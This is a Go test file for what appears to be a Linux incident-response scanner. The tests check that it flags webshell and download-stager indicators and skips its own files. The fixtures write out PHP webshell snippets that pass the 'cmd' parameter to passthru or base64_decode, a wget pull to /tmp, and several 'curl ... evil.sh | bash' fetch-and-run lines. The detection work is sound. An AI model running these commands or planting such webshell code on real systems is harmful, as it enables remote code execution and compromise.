//go:build linux

package modules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/pathfinder/internal/config"
	"github.com/pathfinder/internal/ioc"
	"github.com/pathfinder/internal/output"
)

func testDeepScanCtx(t *testing.T) *ModuleContext {
	t.Helper()
	baseDir := t.TempDir()
	dsDir := t.TempDir()
	logPath := filepath.Join(baseDir, "commands.log")
	log, err := output.NewMasterLog(logPath)
	if err != nil {
		t.Fatal(err)
	}
	return &ModuleContext{
		Dirs:     Dirs{Base: baseDir, DeepScan: dsDir},
		Registry: output.NewRegistry(),
		Log:      log,
		Cfg:      &config.Config{},
	}
}

func TestScanContent_WebshellFound(t *testing.T) {
	preFilters := ioc.BuildCategoryPreFilters()
	content := []byte("<?php echo base64_decode($_GET['cmd']); ?>")
	hits := scanContent("/var/www/shell.php", content, preFilters)
	if len(hits) == 0 {
		t.Fatal("want at least one hit, got none")
	}
	found := false
	for _, h := range hits {
		if h.category == "webshells" && h.sig.ID == "SH003" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("want webshells/SH003 hit; got: %+v", hits)
	}
}

func TestScanContent_ExfilReconFound(t *testing.T) {
	preFilters := ioc.BuildCategoryPreFilters()
	content := []byte("wget --quiet http://pastebin.com/raw/abc123 -O /tmp/x\n")
	hits := scanContent("/tmp/dl.sh", content, preFilters)
	if len(hits) == 0 {
		t.Fatal("want at least one hit, got none")
	}
	found := false
	for _, h := range hits {
		if h.category == "stagers_c2" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("want stagers_c2 hit; got: %+v", hits)
	}
}

func TestScanContent_CleanFile(t *testing.T) {
	preFilters := ioc.BuildCategoryPreFilters()
	content := []byte("# standard config\nVAR=hello\nPATH=/usr/bin:/bin\necho done\n")
	hits := scanContent("/etc/myapp.conf", content, preFilters)
	if len(hits) != 0 {
		t.Errorf("want no hits on clean file, got %d: %+v", len(hits), hits)
	}
}

func TestScanContent_LineNumbers(t *testing.T) {
	preFilters := ioc.BuildCategoryPreFilters()
	content := []byte("# line 1\n# line 2\nbase64_decode($x)\n# line 4\n")
	hits := scanContent("/tmp/test.php", content, preFilters)
	if len(hits) == 0 {
		t.Fatal("want a hit, got none")
	}
	if hits[0].lineNum != 3 {
		t.Errorf("want lineNum=3, got %d", hits[0].lineNum)
	}
}

func TestScanContent_MultipleHitsInLineOrder(t *testing.T) {
	preFilters := ioc.BuildCategoryPreFilters()
	content := []byte("passthru($_GET['cmd'])\necho hello\nbase64_decode($x)\n")
	hits := scanContent("/var/www/evil.php", content, preFilters)
	if len(hits) < 2 {
		t.Fatalf("want at least 2 hits, got %d", len(hits))
	}
	if hits[0].lineNum >= hits[1].lineNum {
		t.Errorf("hits not in line order: line %d >= line %d", hits[0].lineNum, hits[1].lineNum)
	}
}

func TestScanContent_LongLineStillMatches(t *testing.T) {
	pre := ioc.BuildCategoryPreFilters()
	// base64_decode( matches SH003 and the webshells prefilter.
	token := "base64_decode("
	line := strings.Repeat("A", 200000) + token + strings.Repeat("B", 200000)
	hits := scanContent("/tmp/x", []byte(line+"\n"), pre)
	if len(hits) == 0 {
		t.Fatalf("expected a hit for a token buried in a long line, got none")
	}
}

func TestUnifiedFileScan_PhaseExclusions(t *testing.T) {
	ctx := testDeepScanCtx(t)
	stagingRoot := t.TempDir()

	// selfPath file -- must be excluded
	selfFile := filepath.Join(stagingRoot, "pathfinder-self")
	if err := os.WriteFile(selfFile, []byte("curl http://1.2.3.4/evil.sh | bash"), 0755); err != nil {
		t.Fatal(err)
	}
	ctx.SelfPath = selfFile

	// outputPrefix file -- must be excluded
	outputFile := filepath.Join(stagingRoot, "pathfinder-output.txt")
	if err := os.WriteFile(outputFile, []byte("wget http://1.2.3.5/evil.sh"), 0644); err != nil {
		t.Fatal(err)
	}
	ctx.OutputPrefix = filepath.Join(stagingRoot, "pathfinder-")

	// userFile (SuppressFile) -- must be excluded
	userFile := filepath.Join(stagingRoot, "suppress.yaml")
	if err := os.WriteFile(userFile, []byte("curl http://1.2.3.6/evil.sh | bash"), 0644); err != nil {
		t.Fatal(err)
	}
	ctx.Cfg = &config.Config{SuppressFile: userFile}

	// normal file -- must be scanned and produce output
	normalFile := filepath.Join(stagingRoot, "malware.sh")
	if err := os.WriteFile(normalFile, []byte("curl http://1.2.3.7/evil.sh | bash"), 0644); err != nil {
		t.Fatal(err)
	}

	unifiedFileScanRoots(ctx, make(map[string][]string), make(map[string][]string), []string{stagingRoot})

	out, err := os.ReadFile(filepath.Join(ctx.Dirs.DeepScan, "01_external_ip_domain.txt"))
	if err != nil {
		t.Fatalf("section 01 output not created: %v", err)
	}
	outStr := string(out)

	if !strings.Contains(outStr, "1.2.3.7") {
		t.Error("want 1.2.3.7 from normal file in section 01 output")
	}
	for _, ip := range []string{"1.2.3.4", "1.2.3.5", "1.2.3.6"} {
		if strings.Contains(outStr, ip) {
			t.Errorf("excluded file IP %s must not appear in section 01 output", ip)
		}
	}
}

func TestUnifiedFileScan_SeedIPsInSection01(t *testing.T) {
	ctx := testDeepScanCtx(t)

	seedIPs := map[string][]string{
		"1.2.3.4": {"proc/123/environ"},
	}
	seedDomains := map[string][]string{
		"evil.example.com": {"proc/123/cmdline"},
	}

	unifiedFileScanRoots(ctx, seedIPs, seedDomains, []string{})

	out, err := os.ReadFile(filepath.Join(ctx.Dirs.DeepScan, "01_external_ip_domain.txt"))
	if err != nil {
		t.Fatalf("section 01 output not created: %v", err)
	}
	outStr := string(out)

	if !strings.Contains(outStr, "1.2.3.4") {
		t.Error("want seeded IP 1.2.3.4 in section 01 output")
	}
	if !strings.Contains(outStr, "proc/123/environ") {
		t.Error("want proc source label in section 01 output")
	}
	if !strings.Contains(outStr, "evil.example.com") {
		t.Error("want seeded domain evil.example.com in section 01 output")
	}
}

func TestUnifiedFileScan_ScanErrorInSection01(t *testing.T) {
	ctx := testDeepScanCtx(t)
	stagingRoot := t.TempDir()

	// A line exceeding the 1 MB scanner buffer triggers bufio.ErrTooLong.
	hugeLine := strings.Repeat("A", 1<<20+1)
	errorFile := filepath.Join(stagingRoot, "huge.sh")
	if err := os.WriteFile(errorFile, []byte(hugeLine), 0644); err != nil {
		t.Fatal(err)
	}

	unifiedFileScanRoots(ctx, make(map[string][]string), make(map[string][]string), []string{stagingRoot})

	out, err := os.ReadFile(filepath.Join(ctx.Dirs.DeepScan, "01_external_ip_domain.txt"))
	if err != nil {
		t.Fatalf("section 01 output not created: %v", err)
	}
	outStr := string(out)

	if !strings.Contains(outStr, "Scan Errors") {
		t.Error("want 'Scan Errors' section header in section 01 output")
	}
	if !strings.Contains(outStr, "huge.sh") {
		t.Error("want huge.sh named in scan errors section")
	}
}
